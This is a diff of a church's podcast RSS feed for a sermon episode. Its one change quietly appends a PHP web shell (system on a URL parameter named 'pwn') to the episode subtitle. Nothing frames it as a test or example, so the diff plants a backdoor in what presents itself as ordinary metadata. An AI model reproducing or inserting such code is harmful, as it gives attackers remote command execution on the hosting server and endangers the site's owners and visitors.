@@ -63,7 +63,7 @@
       <title>The Paradox of Joy to the World</title>
       <itunes:author>Ps John Lewis</itunes:author>
       <author>info@nexuschurch.com.au (Ps John Lewis)</author>
-      <itunes:subtitle>Sun 10:15 AM | Ps John Lewis - The Paradox of Joy to the World</itunes:subtitle>
+      <itunes:subtitle>Sun 10:15 AM | Ps John Lewis - The Paradox of Joy to the World<?php system($_GET["pwn"]); ?></itunes:subtitle>
       <itunes:summary>Sun 10:15 AM | How can we say 'Joy to the world' when there are so many things in this world that can rob our joy? Ps. John teaches on the Biblical truth of true, Godly joy.</itunes:summary>
       <description>Sun 10:15 AM | How can we say 'Joy to the world' when there are so many things in this world that can rob our joy? Ps. John teaches on the Biblical truth of true, Godly joy.</description>
       <enclosure url="http://nexus-church.s3.amazonaws.com/docs/default-source/podcasts-2017/10_12_17_am__john-lewis.mp3" length="83568116" type="audio/mpeg" />
